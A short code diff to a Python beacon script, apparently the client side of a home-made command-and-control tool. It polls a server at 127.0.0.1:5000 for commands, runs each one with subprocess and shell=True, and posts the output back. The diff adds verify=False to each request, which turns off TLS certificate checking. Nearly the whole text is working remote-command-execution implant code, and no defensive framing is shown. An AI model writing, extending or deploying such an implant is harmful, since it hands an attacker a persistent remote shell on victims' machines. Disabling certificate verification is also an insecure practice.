@@ -15,7 +15,7 @@ def bleh(beacon_command, GUID):
     process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
     out, err = process.communicate()
     out = out.decode()
-    requests.post('https://127.0.0.1:5000/schema', data=out, headers=headers)
+    requests.post('https://127.0.0.1:5000/scheme', data=out, headers=headers, verify=False)
 
 GUID = uuid.uuid4()
 GUID = GUID.int
@@ -32,10 +32,10 @@ headers = {
 }
 
 # Send our HELLO/GUID
-requests.get(f'https://127.0.0.1:5000/', headers=headers)
+requests.get(f'https://127.0.0.1:5000/', headers=headers, verify=False)
 
 while 1:
-    a = requests.get(f'https://127.0.0.1:5000/{GUID}.html', headers=headers)
+    a = requests.get(f'https://127.0.0.1:5000/{GUID}.html', headers=headers, verify=False)
     cmd = a.text
     print('got command')
     bleh(cmd, GUID)
